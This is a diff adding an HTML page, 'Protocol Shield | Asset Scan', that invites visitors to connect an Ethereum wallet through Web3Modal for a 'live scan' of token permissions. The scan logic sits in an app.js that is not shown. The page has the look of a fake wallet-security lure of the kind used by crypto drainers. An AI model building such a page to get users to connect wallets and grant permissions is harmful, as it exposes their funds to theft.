@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protocol Shield | Asset Scan</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: #eaecef; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: transform 0.2s; }
+        .btn:active { transform: scale(0.98); }
+        #status { margin-top: 25px; font-size: 14px; color: #848e9c; min-height: 40px; }
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">🛡️</div>
+        <h2 style="margin: 0 0 10px 0;">Asset Firewall</h2>
+        <p style="font-size: 14px; color: #848e9c;">Scan your wallet for high-risk token permissions.</p>
+        <button id="cta-btn" class="btn" onclick="startProScan()">Start Live Scan</button>
+        <div id="status">Secure Connection: Idle</div>
+    </div>
+
+    <script type="module">
+        import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5'
+        // YOUR SPECIFIC PROJECT ID
+        const projectId = '9852bd6bf8b5fbf5b83637b7bb284d73';
+        const mainnet = { chainId: 1, name: 'Ethereum', currency: 'ETH', explorerUrl: 'https://etherscan.io', rpcUrl: 'https://cloudflare-eth.com' }
+        window.modal = createWeb3Modal({ 
+            ethersConfig: defaultConfig({ metadata: { name: 'Security Lab', url: window.location.origin } }), 
+            chains: [mainnet], 
+            projectId 
+        });
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
